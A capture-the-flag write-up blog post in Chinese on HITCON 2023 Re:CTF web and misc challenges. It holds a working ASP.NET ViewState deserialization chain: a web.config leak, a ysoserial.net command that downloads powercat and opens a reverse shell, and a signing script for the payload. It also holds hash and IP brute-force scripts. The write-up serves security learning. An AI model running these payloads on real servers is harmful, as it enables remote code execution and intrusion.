@@ -1,0 +1,167 @@
+---
+layout: post
+title: "[CTF] HITCON 2023 Re:CTF"
+date: 2023-08-21 +0800
+categories: CTF
+hidden: false
+---
+
+## Web
+
+### why-so-serials
+
+ - 上傳.shtml
+
+    ```html
+    <!--#include file="..\..\web.config" -->
+    ```
+
+    ![](/images/2023/08/6MBqfic.png)
+
+ - 取得validationKey
+
+   ![](/images/2023/08/dslQNTw.png)
+
+
+ - 下載[ysoserial Github](https://github.com/pwntester/ysoserial.net/releases/tag/master-Release-29)
+
+
+
+    ```powershell
+    .\ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c {your IP} -p 5278 -e cmd" -o base64
+    ```
+
+    ![](/images/2023/08/ozpv4xN.png)
+
+ - 使用python將serialized_data加上validation_key
+
+    ```python
+    import base64
+    import hashlib
+    serialized_data_b64 = "/wEy9RIAAQAAAP////8BAAAAAAAAAAwCAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAAIQBU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuU29ydGVkU2V0YDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAVDb3VudAhDb21wYXJlcgdWZXJzaW9uBUl0ZW1zAAMABgiNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQgCAAAAAgAAAAkDAAAAAgAAAAkEAAAABAMAAACNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQEAAAALX2NvbXBhcmlzb24DIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIJBQAAABEEAAAAAgAAAAYGAAAAuwEvYyBwb3dlcnNoZWxsIElFWCAoTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYmNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9iZXNpbW9yaGluby9wb3dlcmNhdC9tYXN0ZXIvcG93ZXJjYXQucHMxJyk7cG93ZXJjYXQgLWMgMjAzLjIwNC4yNDYuMjEzIC1wIDUyNzggLWUgY21kBgcAAAADY21kBAUAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdGUHbWV0aG9kMAdtZXRob2QxAwMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkIAAAACQkAAAAJCgAAAAQIAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BgsAAACwAlN5c3RlbS5GdW5jYDNbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GDAAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkKBg0AAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQYOAAAAGlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzBg8AAAAFU3RhcnQJEAAAAAQJAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQkPAAAACQ0AAAAJDgAAAAYUAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhUAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEKAAAACQAAAAYWAAAAB0NvbXBhcmUJDAAAAAYYAAAADVN5c3RlbS5TdHJpbmcGGQAAACtJbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhoAAAAyU3lzdGVtLkludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEQAAAACAAAAAYbAAAAcVN5c3RlbS5Db21wYXJpc29uYDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCQwAAAAKCQwAAAAJGAAAAAkWAAAACgs="
+    validation_key = "5E6BBAFDFB86ED0863351B36ABAEF99E643F057D".decode('hex')
+    serialized_data = base64.b64decode(serialized_data_b64)
+    m = hashlib.md5()
+    m.update(serialized_data + validation_key + "\x00\x00\x00\x00")
+    payload = base64.b64encode(serialized_data + m.digest())
+    print(payload)
+    ```
+
+    ![](/images/2023/08/ChkZszk.png)
+
+- 送出viewstate
+
+    ![](/images/2023/08/NvVFesp.png)
+
+- 取得reverse shell
+
+    ![](/images/2023/08/7G8DaPk.png)
+
+    ![](/images/2023/08/8CxJuEw.png)
+
+
+### papapa
+
+- 憑證domain (很可疑~)
+    ![](/images/2023/08/ffeOVhU.png)
+
+- 內文
+    ![](/images/2023/08/4BG0qv6.png)
+
+- 修改Host (讓它連線到flag站台)
+    ![](/images/2023/08/FRunn6N.png)
+
+
+### yeeclass
+
+ - 查看公開的submissions
+
+    ![](/images/2023/08/FxEUkbA.png)
+
+ - 發現homeworkid=1沒有權限查看
+
+    ![](/images/2023/08/IerSHSy.png)
+
+ - 使用未登入帳號繞過
+    ![](/images/2023/08/gr87wSM.png)
+
+ - 自己發個測試，貼文規則為
+     ```
+     http://rectf.hitcon2023.online:30203/submission.php?hash=sha1(username_{timestamp}{microseconds})
+     ```
+      ![](/images/2023/08/bzzpkt3.png)
+
+ - 所以flag應該為
+     ```
+     http://rectf.hitcon2023.online:30203/submission.php?hash=sha1(flagholder_64da4cce{microseconds})
+     ```
+
+ - 由於microseconds有時間差，使用python爆破
+
+    ```python
+    import requests
+    import hashlib
+    from datetime import datetime, timezone
+    session = requests.session()
+    s ='flagholder_64da4cce8cc'
+    for i in range(0xff):
+        h = s+f'{i:02x}'
+        hash = hashlib.sha1(h.encode()).hexdigest()
+        r = session.get('http://rectf.hitcon2023.online:30203/submission.php?hash='+hash)
+        print(f'{h}:{r.content}')
+        if b'not found' not in r.content:
+            break
+    ```
+ - 結果
+
+    ![](/images/2023/08/a62bwvr.png)
+
+
+## Misc
+
+### unreadable
+- 使用xxd
+
+    ```bash
+    xxd unreadable-4b2868cc26a8dad5695e537a9dd8a164
+    ```
+    ![](/images/2023/08/zde8mKK.png)
+
+- 縮小
+
+    ![](/images/2023/08/6uz0rPN.png)
+
+
+### fbi-warning
+
+- 取得ID和時間 ( ID: E98SXRsI / 時間:20211203 )
+
+    ![](/images/2023/08/dwtynvX.png)
+
+ - futaba.php存在預設seed (idの種) 和id生成的方法
+
+
+ - 暴力破解
+
+    ```php
+    <?php
+    for ($x = 0; $x <= 255; $x++) {
+      for ($y = 0; $y <= 255; $y++) {
+        for ($z = 0; $z <= 255; $z++) {
+            $IP = '217.'.$x.".".$y.".".$z;
+            if (substr(crypt(md5($IP.'idの種20211203'),'id'), -8) == 'E98SXRsI'){
+              echo $IP;
+              die();
+            }
+          }
+        }
+      }
+    ?>
+    ```
+
+- 執行php
+
+    ![](/images/2023/08/x2xN5UT.png)
+
+## The End
+![](/images/2023/08/RvQMBEr.png)
